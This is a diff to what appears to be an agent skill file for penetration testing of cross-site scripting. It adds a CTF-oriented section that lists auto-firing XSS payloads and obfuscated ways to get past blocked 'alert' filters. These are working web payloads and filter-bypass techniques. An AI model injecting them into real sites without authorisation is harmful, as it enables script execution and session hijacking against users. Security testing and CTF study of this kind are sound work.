@@ -1,12 +1,6 @@
 ---
 name: testing-for-xss-vulnerabilities
-description: 'Tests web applications for Cross-Site Scripting (XSS) vulnerabilities by injecting JavaScript payloads into
-  reflected, stored, and DOM-based contexts to demonstrate client-side code execution, session hijacking, and user impersonation.
-  The tester identifies all injection points and output contexts, crafts context-appropriate payloads, and bypasses sanitization
-  and CSP protections. Activates for requests involving XSS testing, cross-site scripting assessment, client-side injection
-  testing, or JavaScript injection vulnerability testing.
-
-  '
+description: 'Tests web applications for Cross-Site Scripting (XSS) vulnerabilities by injecting JavaScript payloads into reflected, stored, and DOM-based contexts to demonstrate client-side code execution, session hijacking, and user impersonation. The tester identifies all injection points and output contexts, crafts context-appropriate payloads, and bypasses sanitization and CSP protections. Activates for requests involving XSS testing, cross-site scripting assessment, client-side injection testing, or JavaScript injection vulnerability testing.'
 domain: cybersecurity
 subdomain: penetration-testing
 tags:
@@ -86,6 +80,16 @@ Test reflected injection points with context-appropriate payloads:
   - Event handlers: `<details open ontoggle=alert(1)>`
   - SVG: `<svg><animate onbegin=alert(1) attributeName=x>`
   - Encoding: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`
+
+#### Execution-oracle XSS (fire a dialog to win / capture a flag)
+
+Some targets — CTF-style challenges especially — run your payload in a **server-side headless browser** and return a success/flag string **in the same HTTP response** the moment a dialog (`alert`/`confirm`/`prompt`) fires. There is NO external victim to exfiltrate to: submit the payload and read the response for the flag/"Congratulations"/"Correct". To win these reliably:
+
+- **Use AUTO-FIRING vectors** (no user click, execute in a headless checker): `<img src=x onerror=alert('XSS')>`, `<svg onload=alert('XSS')>`, `<body onload=alert('XSS')>`, `<input autofocus onfocus=alert('XSS')>`, `<details open ontoggle=alert('XSS')>`, `<video><source onerror=alert('XSS')>`, `<marquee onstart=alert('XSS')>`.
+- **Use the EXACT required string.** If the task says `alert('XSS')`, the argument must be exactly `XSS` (right case) — not `alert(1)` or the reflected value. A response like "you used 1 instead of XSS" means the dialog fired but with the wrong argument: re-fire with the exact string.
+- **Bypass a blocked sink name.** If `alert` is filtered, `confirm('XSS')` and `prompt('XSS')` trigger the same dialog oracle; or obfuscate: `window['al'+'ert']('XSS')`, `self[/al/.source+/ert/.source]('XSS')`, `top['ale'+'rt']('XSS')`, `(alert)('XSS')`, `eval('ale'+'rt(\'XSS\')')`.
+- **Match the injection CONTEXT.** Determine whether your input lands in an attribute (`" onfocus=... autofocus`), inside a tag, or as raw HTML after a closed tag, and break out accordingly before the auto-firing element.
+- **Persist and cycle vectors** — `img onerror` → `svg onload` → `autofocus onfocus` → `details ontoggle` → `iframe/video onerror`. Do NOT abandon a known XSS challenge for directory brute-forcing or unrelated recon; the win is a working execution payload.
 
 ### Step 3: Stored XSS Testing
 
